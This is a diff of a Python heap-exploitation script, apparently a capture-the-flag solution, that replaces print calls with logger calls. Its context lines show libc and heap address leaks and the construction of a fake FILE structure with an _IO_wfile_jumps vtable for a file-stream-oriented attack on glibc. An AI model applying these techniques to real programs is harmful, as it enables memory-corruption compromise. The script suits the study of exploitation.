@@ -64,13 +64,12 @@ def main():
     free(2)
     alloc(0x1)  # 7
     libc.base = ptr.u64(view(3, 6)) - unwrap(libc.symbol("main_arena")) - 96
-    print(f"libc_base: {hex(libc.base)}")
 
     alloc(1)  # 8
     alloc(1)  # 9
     free(4)
     heap_base = ptr.u64(view(9, 5)) << 12
-    print(f"heap_base: {hex(heap_base)}")
+    ptr.logger.info(f"heap_base: {hex(heap_base)}")
 
     # _IO_flush_all_lockp
     # fp.mode <= 0 && fp._IO_write_ptr > fp._IO_write_base
@@ -123,12 +122,12 @@ def main():
     fake_io = fake_io.ljust(216, b"\x00")
     fake_io += ptr.p64(unwrap(libc.symbol("_IO_wfile_jumps")))  # vtable
 
-    print(f"fake_io_length: {hex(len(fake_io))}")
-    print(f"fake_io_addr: {hex(fake_io_addr)}")
-    print(f"fake_wide_data_length: {hex(len(fake_wide_data))}")
-    print(f"fake_wide_data_addr: {hex(fake_wide_data_addr)}")
-    print(f"fake_wide_vtable_length: {hex(len(fake_wide_vtable))}")
-    print(f"fake_wide_vtable_addr: {hex(fake_wide_vtable_addr)}")
+    ptr.logger.info(f"fake_io_length: {hex(len(fake_io))}")
+    ptr.logger.info(f"fake_io_addr: {hex(fake_io_addr)}")
+    ptr.logger.info(f"fake_wide_data_length: {hex(len(fake_wide_data))}")
+    ptr.logger.info(f"fake_wide_data_addr: {hex(fake_wide_data_addr)}")
+    ptr.logger.info(f"fake_wide_vtable_length: {hex(len(fake_wide_vtable))}")
+    ptr.logger.info(f"fake_wide_vtable_addr: {hex(fake_wide_vtable_addr)}")
 
     alloc(0x3F0, b"A" * 0x3F0)  # 10
     alloc(len(fake_io), fake_io)  # 11
